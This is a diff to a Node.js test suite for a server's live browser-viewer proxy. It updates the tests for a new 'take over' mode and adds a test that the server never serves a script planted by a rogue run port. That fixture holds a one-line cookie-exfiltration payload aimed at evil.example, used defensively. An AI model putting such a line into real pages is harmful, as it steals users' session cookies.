@@ -1,8 +1,8 @@
-// The owner watches a run's browser live (browser-live.ts): the run's process serves pi-browser's own viewer, read-only, on
+// The owner watches a run's browser live (browser-live.ts): the run's process serves pi-browser's own viewer on
 // a loopback port of its own and hands it over in one 0600 file in the run's directory; the server gives the viewer's
 // link to the owner's signed-in page alone, and proxies its page and its WebSocket, from this server's own origin alone,
 // under a CSP framed by 'self' on that route only. A frame goes from the browser to the viewer through the proxy; input
-// never reaches the browser; a second viewer is refused; the token is in no record, row, view, file list or log; and it
+// before Take over never reaches the browser (browser-take-over.test.mjs has the rest); a second viewer is refused; the token is in no record, row, view, file list or log; and it
 // dies with its session. On fakes: no network, no key.
 import assert from "node:assert/strict";
 import { readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
@@ -49,7 +49,7 @@ const browserOf = (w, headers) => call(w.server.port, { path: `/v2/runs/${w.runI
 /** A WebSocket to `path`: from the server's own origin (null: none) with the owner's cookie (null: none), unless told. */
 const liveWs = (w, path, { origin = w.origin, cookie = w.cookie, headers = {} } = {}) => connect(`ws://127.0.0.1:${w.server.port}${path}`, { origin: origin ?? undefined, headers: { ...(cookie ? { cookie } : {}), ...headers } });
 
-test("the owner's signed-in page alone gets the viewer's link; the page is framed by 'self' on that route alone; a frame reaches the viewer through the proxy, its input never reaches the browser, and a second viewer is refused", { timeout: 120_000 }, async (t) => {
+test("the owner's signed-in page alone gets the viewer's link; the page is framed by 'self' on that route alone; a frame reaches the viewer through the proxy, its input before Take over never reaches the browser, and a second viewer is refused", { timeout: 120_000 }, async (t) => {
   const w = await watched(t);
   const handed = JSON.parse(readFileSync(w.file, "utf8"));
   assert.equal(statSync(w.file).mode & 0o777, 0o600, "the hand-over is the server's user's alone");
@@ -89,14 +89,14 @@ test("the owner's signed-in page alone gets the viewer's link; the page is frame
   const first = await liveWs(w, wsPath);
   assert.equal(first.status, 101);
   first.ws.sendJson({ type: "hello", token: handed.token });
-  assert.deepEqual(JSON.parse((await first.ws.next(5_000)).data), { type: "ready", drive: "idle", readOnly: true });
+  assert.deepEqual(JSON.parse((await first.ws.next(5_000)).data), { type: "ready", drive: "idle", takeOver: true, held: false });
   const { item: frame } = await first.ws.until((m) => m.type === "binary", 10_000);
   assert.ok(frame, "a screencast frame arrived through the proxy");
   assert.deepEqual([frame.data.readUInt16BE(0), frame.data.readUInt16BE(2)], [FRAME.w, FRAME.h]);
   assert.deepEqual(frame.data.subarray(4), FRAME.bytes, "the browser's frame, byte for byte");
-  first.ws.sendJson({ type: "text", text: "typed into a read-only view" });
+  first.ws.sendJson({ type: "text", text: "typed before taking over" });
   const { item: held } = await first.ws.until((m) => m.type === "text" && JSON.parse(m.data).type === "held", 5_000);
-  assert.deepEqual(JSON.parse(held.data), { type: "held", reason: "read_only" }, "input is dropped by the run, never sent");
+  assert.deepEqual(JSON.parse(held.data), { type: "held", reason: "not_taken" }, "input is dropped by the run, never sent");
   const second = await liveWs(w, wsPath);
   assert.equal(second.status, 101);
   second.ws.sendJson({ type: "hello", token: handed.token });
@@ -139,11 +139,6 @@ test("the viewer's token and its file are in no record, row, view, file list, ho
   assert.equal((await liveWs(w, wsPath)).status, 404, "the old link opens nothing");
   assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/v/${handed.id}`, headers: { cookie: w.cookie } })).status, 404);
   assert.ok(!filesUnder(runDir).some(([, bytes]) => bytes.includes(handed.token)), "and nothing of the run's holds the token");
-});
-
-test("capabilities say the owner may watch a run's browser, read-only", async (t) => {
-  const { api } = await serve(t);
-  assert.deepEqual((await api("GET", "/capabilities")).body.features.browser_live, { read_only: true });
 });
 
 test("the route says whether a run has a browser at all: off with why when its agent has none or its browser resolves unavailable, none when it has one with no session open", { timeout: 120_000 }, async (t) => {
@@ -203,6 +198,42 @@ test("a run's process that dies without letting its sessions go takes its hand-o
   assert.deepEqual((await browserOf(w, { cookie: w.cookie })).json, { state: "none" }, "no live process: no viewer");
   assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/v/${handed.id}`, headers: { cookie: w.cookie } })).status, 404, "nothing proxied");
   assert.equal((await liveWs(w, `/v2/runs/${w.runId}/browser/live/v/${handed.id}/ws`)).status, 404);
+});
+
+test("the viewer's code is always this server's own: a run's port that answers the viewer's page and files with a planted script is never served from, and only the viewer's socket reaches it", { timeout: 120_000 }, async (t) => {
+  const w = await watched(t);
+  const handed = JSON.parse(readFileSync(w.file, "utf8"));
+  const { viewerAssets } = await import("@parcha/pi-browser/live-view");
+  const { createServer } = await import("node:http");
+  const { createHash } = await import("node:crypto");
+  // A port that answers every page and file with a script of its own, and takes the socket.
+  const asked = [];
+  const upgraded = [];
+  const sockets = new Set();
+  const planted = createServer((req, res) => { asked.push(req.url); res.writeHead(200, { "content-type": "text/javascript" }); res.end("fetch('https://evil.example/?' + document.cookie)"); });
+  planted.on("upgrade", (req, socket) => {
+    upgraded.push(req.url);
+    sockets.add(socket);
+    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${createHash("sha1").update(`${req.headers["sec-websocket-key"]}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64")}\r\n\r\n`);
+    socket.on("error", () => {});
+  });
+  await new Promise((resolve) => planted.listen(0, "127.0.0.1", resolve));
+  // An upgraded socket is no longer the server's to close: it is ended here.
+  t.after(() => new Promise((resolve) => { for (const socket of sockets) socket.destroy(); planted.close(resolve); planted.closeAllConnections(); }));
+  writeFileSync(w.file, JSON.stringify({ ...handed, port: planted.address().port }), { mode: 0o600 });
+  const base = `/v2/runs/${w.runId}/browser/live`;
+  for (const [rest, bytes, type] of [[`/v/${handed.id}`, viewerAssets.html, /^text\/html/], ["/viewer.js", viewerAssets.js, /^text\/javascript/], ["/viewer.css", viewerAssets.css, /^text\/css/]]) {
+    const got = await call(w.server.port, { path: `${base}${rest}`, headers: { cookie: w.cookie } });
+    assert.equal(got.status, 200, rest);
+    assert.equal(got.text, bytes, `${rest}: this server's own pi-browser viewer, byte for byte`);
+    assert.match(got.headers["content-type"], type);
+    assert.match(got.headers["content-security-policy"], /script-src 'self'; .*connect-src 'self';.*frame-ancestors 'self'/);
+  }
+  assert.deepEqual(asked, [], "no page or file was asked of the run's port");
+  const socket = await liveWs(w, `${base}/v/${handed.id}/ws`);
+  assert.equal(socket.status, 101);
+  assert.deepEqual(upgraded, [`/v/${handed.id}/ws`], "the socket alone reached it");
+  socket.ws.destroy();
 });
 
 test("behind a TLS proxy that rewrites Host or drops X-Forwarded-Proto, the owner's WebSocket from the server's public address is taken; another origin still is not", { timeout: 120_000 }, async (t) => {
